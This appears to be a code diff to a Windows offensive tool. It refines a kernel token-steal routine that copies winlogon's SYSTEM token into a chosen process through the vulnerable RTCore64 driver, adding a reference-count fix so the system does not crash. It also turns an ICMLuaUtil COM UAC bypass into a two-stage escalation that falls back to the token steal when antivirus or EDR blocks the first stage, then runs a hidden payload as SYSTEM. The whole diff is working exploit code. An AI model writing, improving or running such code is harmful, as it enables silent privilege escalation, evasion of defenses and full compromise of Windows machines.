@@ -7,6 +7,7 @@
 #include "kutil.h"
 #include "ansi.h"
 #include "driver/IDriverBackend.h"
+#include "driver/RTCore64Backend.h"
 
 // ─── /elevate-pid <pid> ────────────────────────────────────────────────────────
 // Kernel token steal: writes winlogon.exe's EX_FAST_REF Token value directly
@@ -68,23 +69,41 @@ void CmdElevatePid(DWORD targetPid) {
     printf("%s[*]%s winlogon Token    = 0x%llX\n", A_CYAN, A_RESET, winlogonToken);
     printf("%s[*]%s target   Token    = 0x%llX  (before)\n", A_CYAN, A_RESET, targetToken);
 
-    if (!g_drv->IsKernelVA(winlogonToken & ~0xFULL)) {
+    // Strip EX_FAST_REF low bits to get the clean TOKEN object pointer.
+    DWORD64 tokenPtr = winlogonToken & ~0xFULL;
+
+    if (!g_drv->IsKernelVA(tokenPtr)) {
         printf("%s[!]%s winlogon Token pointer looks invalid (0x%llX) — aborting.\n",
                A_RED, A_RESET, winlogonToken);
         return;
     }
 
-    g_drv->Wr64(dstTokenSlot, winlogonToken);
+    // Increment OBJECT_HEADER.PointerCount before adding a new reference.
+    // OBJECT_HEADER is immediately before the object body; Body is at +0x30,
+    // so PointerCount (OBJECT_HEADER+0x000) is at tokenPtr - 0x30.
+    // Skipping this causes bugcheck 0x18 (REFERENCE_BY_POINTER) when the
+    // kernel later calls ObfDereferenceObjectWithTag and the count goes to -1.
+    static const DWORD64 OBJ_HDR_PTRCOUNT_OFFSET = 0x30;
+    DWORD64 ptrCountAddr = tokenPtr - OBJ_HDR_PTRCOUNT_OFFSET;
+    DWORD64 ptrCount     = g_drv->Rd64(ptrCountAddr);
+    g_drv->Wr64(ptrCountAddr, ptrCount + 1);
+    printf("%s[*]%s Token OBJECT_HEADER.PointerCount  0x%llX -> 0x%llX\n",
+           A_CYAN, A_RESET, ptrCount, ptrCount + 1);
+
+    // Write the clean pointer (low bits = 0) so the kernel uses the main
+    // reference count path immediately rather than spending cached refs
+    // that were never recorded in PointerCount.
+    g_drv->Wr64(dstTokenSlot, tokenPtr);
 
     DWORD64 verify = g_drv->Rd64(dstTokenSlot);
-    if (verify == winlogonToken) {
+    if (verify == tokenPtr) {
         printf("%s[+]%s Token written OK  (0x%llX)\n", A_GREEN, A_RESET, verify);
         printf("%s[+]%s PID %u is now running with SYSTEM token (winlogon source).\n",
                A_GREEN, A_RESET, targetPid);
         printf("      To verify: in that process run  whoami  or  whoami /priv\n");
     } else {
         printf("%s[!]%s Verify mismatch: wrote 0x%llX, read back 0x%llX\n",
-               A_RED, A_RESET, winlogonToken, verify);
+               A_RED, A_RESET, tokenPtr, verify);
     }
 }
 
@@ -121,57 +140,117 @@ struct ICMLuaUtil : IUnknown {
 };
 
 void CmdElevateSelf(const char* extraCmdA) {
-    // Payload: sc start RTCore64, then optional extra
-    wchar_t params[1024];
-    if (extraCmdA && *extraCmdA) {
-        wchar_t extra[512]{};
-        MultiByteToWideChar(CP_ACP, 0, extraCmdA, -1, extra, 511);
-        swprintf_s(params, L"/c \"sc start RTCore64 & %s\"", extra);
-    } else {
-        wcscpy_s(params, L"/c sc start RTCore64");
-    }
-
-    printf("%s[*]%s ICMLuaUtil COM UAC bypass\n", A_CYAN, A_RESET);
-    printf("%s[*]%s Payload: cmd.exe %ls\n", A_CYAN, A_RESET, params);
-
-    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
-    if (FAILED(hr)) {
-        printf("%s[!]%s CoInitializeEx failed (0x%08X)\n", A_RED, A_RESET, hr);
-        return;
-    }
-
-    // Elevation moniker: "Elevation:Administrator!new:{CLSID}"
-    wchar_t moniker[256];
-    swprintf_s(moniker,
-        L"Elevation:Administrator!new:{6EDD6D74-C007-4E75-B76A-E5740995E24C}");
-
-    BIND_OPTS3 bo{};
-    bo.cbStruct     = sizeof(bo);
-    bo.hwnd         = nullptr;
-    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
-
-    ICMLuaUtil* util = nullptr;
-    hr = CoGetObject(moniker, &bo, IID_ICMLuaUtil, (void**)&util);
-    if (FAILED(hr)) {
-        printf("%s[!]%s CoGetObject(ICMLuaUtil) failed (0x%08X)\n", A_RED, A_RESET, hr);
-        CoUninitialize();
-        return;
-    }
-    printf("%s[+]%s ICMLuaUtil obtained.\n", A_GREEN, A_RESET);
-
     wchar_t sysdir[MAX_PATH];
     GetSystemDirectoryW(sysdir, MAX_PATH);
     wchar_t cmdExe[MAX_PATH];
     swprintf_s(cmdExe, L"%s\\cmd.exe", sysdir);
 
-    hr = util->ShellExec(cmdExe, params, sysdir, SW_HIDE, TRUE);
-    if (SUCCEEDED(hr))
-        printf("%s[+]%s ShellExec OK — RTCore64 should now be running.\n", A_GREEN, A_RESET);
-    else
-        printf("%s[!]%s ShellExec failed (0x%08X)\n", A_RED, A_RESET, hr);
+    // ── Stage 1: ICMLuaUtil COM UAC bypass ────────────────────────────────────
+    // No driver required. Payload: sc start RTCore64 (+ optional extra command).
+    wchar_t stage1Params[1024];
+    if (extraCmdA && *extraCmdA) {
+        wchar_t extra[512]{};
+        MultiByteToWideChar(CP_ACP, 0, extraCmdA, -1, extra, 511);
+        swprintf_s(stage1Params, L"/c \"sc start RTCore64 & %s\"", extra);
+    } else {
+        wcscpy_s(stage1Params, L"/c sc start RTCore64");
+    }
 
-    util->Release();
-    CoUninitialize();
+    printf("%s[Stage 1]%s  ICMLuaUtil COM UAC bypass\n", A_CYAN, A_RESET);
+    printf("           Payload: cmd.exe %ls\n", stage1Params);
+
+    bool stage1Ok = false;
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) {
+        printf("%s[!]%s CoInitializeEx failed (0x%08X)\n", A_RED, A_RESET, hr);
+    } else {
+        wchar_t moniker[256];
+        swprintf_s(moniker,
+            L"Elevation:Administrator!new:{6EDD6D74-C007-4E75-B76A-E5740995E24C}");
+        BIND_OPTS3 bo{};
+        bo.cbStruct       = sizeof(bo);
+        bo.hwnd           = nullptr;
+        bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+
+        ICMLuaUtil* util = nullptr;
+        hr = CoGetObject(moniker, &bo, IID_ICMLuaUtil, (void**)&util);
+        if (FAILED(hr)) {
+            printf("%s[!]%s CoGetObject(ICMLuaUtil) failed (0x%08X)\n",
+                   A_RED, A_RESET, hr);
+        } else {
+            printf("%s[+]%s ICMLuaUtil obtained.\n", A_GREEN, A_RESET);
+            hr = util->ShellExec(cmdExe, stage1Params, sysdir, SW_HIDE, TRUE);
+            if (SUCCEEDED(hr)) {
+                printf("%s[+]%s ShellExec OK — RTCore64 should now be running.\n",
+                       A_GREEN, A_RESET);
+                stage1Ok = true;
+            } else {
+                printf("%s[!]%s ShellExec failed (0x%08X)\n", A_RED, A_RESET, hr);
+            }
+            util->Release();
+        }
+        CoUninitialize();
+    }
+
+    if (stage1Ok) return;
+
+    // ── Stage 2: Kernel token steal ───────────────────────────────────────────
+    // COM bypass was blocked (AV/EDR hook, UAC policy, etc.).
+    // Requires RTCore64 to already be loaded; no UAC, no consent.exe.
+    //
+    // Technique:
+    //   1. Open RTCore64 (must be loaded by other means)
+    //   2. Write winlogon SYSTEM token into our own EPROCESS
+    //   3. This process is now SYSTEM — CreateProcess inherits the token
+    //   4. Run extraCmd directly (no need to start RTCore64 again)
+    printf("\n%s[Stage 2]%s  COM blocked — kernel token steal\n", A_CYAN, A_RESET);
+    printf("           RTCore64 must already be loaded.\n");
+
+    RTCore64Backend rtcore2;
+    IDriverBackend* savedDrv = g_drv;
+    if (!rtcore2.Open()) {
+        printf("%s[!]%s RTCore64 not available — Stage 2 aborted.\n", A_RED, A_RESET);
+        printf("           Load RTCore64 first (sc start RTCore64), then retry.\n");
+        return;
+    }
+    g_drv = &rtcore2;
+    KUtil::BuildDriverCache();
+
+    DWORD myPid = GetCurrentProcessId();
+    printf("%s[*]%s Stealing SYSTEM token into PID %u...\n",
+           A_CYAN, A_RESET, myPid);
+    CmdElevatePid(myPid);
+
+    // Run payload as SYSTEM
+    if (extraCmdA && *extraCmdA) {
+        wchar_t extra[512]{};
+        MultiByteToWideChar(CP_ACP, 0, extraCmdA, -1, extra, 511);
+        wchar_t cmdline[1024];
+        swprintf_s(cmdline, L"/c \"%s\"", extra);
+
+        printf("%s[*]%s Running payload as SYSTEM: %ls\n", A_CYAN, A_RESET, extra);
+        STARTUPINFOW si{ sizeof(si) };
+        si.dwFlags     = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        if (CreateProcessW(cmdExe, cmdline, nullptr, nullptr, FALSE,
+                           CREATE_NO_WINDOW, nullptr, sysdir, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 10000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            printf("%s[+]%s Stage 2 payload executed.\n", A_GREEN, A_RESET);
+        } else {
+            printf("%s[!]%s CreateProcess failed: %u\n", A_RED, A_RESET, GetLastError());
+        }
+    } else {
+        printf("%s[+]%s Stage 2 complete — this process is now SYSTEM.\n",
+               A_GREEN, A_RESET);
+        printf("           Next: use /drv-load to load any unsigned-side driver,\n");
+        printf("           or /enable-priv SeLoadDriverPrivilege to load via NtLoadDriver.\n");
+    }
+
+    rtcore2.Close();
+    g_drv = savedDrv;
 }
 
 // ─── /enable-priv <privilege_name> ────────────────────────────────────────────
